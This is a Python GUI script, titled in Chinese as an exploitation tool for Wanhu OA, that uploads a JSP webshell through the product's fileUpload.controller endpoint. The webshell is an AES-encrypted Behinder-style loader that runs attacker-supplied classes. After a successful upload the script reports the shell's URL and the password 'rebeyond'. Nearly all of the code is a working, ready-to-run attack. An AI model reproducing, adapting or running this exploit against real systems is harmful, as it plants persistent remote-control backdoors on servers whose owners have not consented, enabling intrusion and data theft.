#!/usr/bin/env python
# -*- coding: utf-8 -*-
from tkinter import *
import time
import urllib3
urllib3.disable_warnings()
import requests
import re
LOG_LINE_NUM = 0

class MY_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name

    # 设置窗口
    def set_init_window(self):
        self.init_window_name.title("万户OA漏洞利用工具  By：XiaoBai")
        self.init_window_name.geometry('800x400+10+10')
        # 标签
        self.init_data_label = Label(self.init_window_name, text="网址")
        self.init_data_label.grid(row=0, column=0)
        self.result_data_label = Label(self.init_window_name, text="结果")
        self.result_data_label.grid(row=0, column=12)
        self.log_label = Label(self.init_window_name, text="日志")
        self.log_label.grid(row=12, column=0)
        # 文本框
        self.init_data_Text = Text(self.init_window_name, width=50, height=5)
        self.init_data_Text.grid(row=1, column=0, rowspan=10, columnspan=10)
        self.result_data_Text = Text(self.init_window_name, width=50, height=18)
        self.result_data_Text.grid(row=1, column=12, rowspan=15, columnspan=10)
        self.log_data_Text = Text(self.init_window_name, width=50, height=10)
        self.log_data_Text.grid(row=13, column=0, columnspan=10)
        # 按钮
        self.exp_button = Button(self.init_window_name, text="Run", bg="lightblue", width=10,
                                              command=self.exp)
        self.exp_button.grid(row=1, column=10)

    # 功能函数
    def exp(self):
        url = self.init_data_Text.get(1.0, END).strip().replace("\n", "")
        target_url = url + "/defaultroot/upload/fileUpload.controller"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
                   "Content-Type": "multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0",
                   "Connection": "Keep-Alive"}
        data = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; " \
               "filename=\"123.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: " \
               "binary\r\n\r\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends " \
               "ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0," \
               "b.length);}}%><%if (request.getMethod().equals(\"POST\")){String " \
               "k=\"e45e329feb5d925b\";/*......tas9er*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(" \
               "\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(" \
               "c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance(" \
               ").equals(pageContext);}%>\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"  # 这里修改上传的webshell
        try:
            r = requests.post(target_url, headers=headers, data=data, timeout=5)
            # print(r.text)
            if "success" in r.text:
                pattern = re.compile(r'"data":"(.*)"}')
                filename = pattern.findall(r.text)[0]
                shell_url = url + "/defaultroot/upload/html/" + filename
                xxx = "[+]存在漏洞! 地址在：" + shell_url + "，密码为rebeyond"
                self.result_data_Text.insert(1.0, xxx)
                self.write_log_to_Text("INFO: " + url + " success")
        except Exception as e:
            self.result_data_Text.insert(1.0, "[-]" + url + "不存在漏洞! \n")
            self.write_log_to_Text("INFO: " + url + " failed")

    # 获取当前时间
    def get_current_time(self):
        current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
        return current_time

    # 日志动态打印
    def write_log_to_Text(self, logmsg):
        global LOG_LINE_NUM
        current_time = self.get_current_time()
        logmsg_in = str(current_time) + " " + str(logmsg) + "\n"  # 换行
        if LOG_LINE_NUM <= 7:
            self.log_data_Text.insert(END, logmsg_in)
            LOG_LINE_NUM = LOG_LINE_NUM + 1
        else:
            self.log_data_Text.delete(1.0, 2.0)
            self.log_data_Text.insert(END, logmsg_in)


def gui_start():
    init_window = Tk()  # 实例化出一个父窗口
    ZMJ_PORTAL = MY_GUI(init_window)
    # 设置根窗口默认属性
    ZMJ_PORTAL.set_init_window()
    init_window.mainloop()  # 父窗口进入事件循环，可以理解为保持窗口运行，否则界面不展示

gui_start()
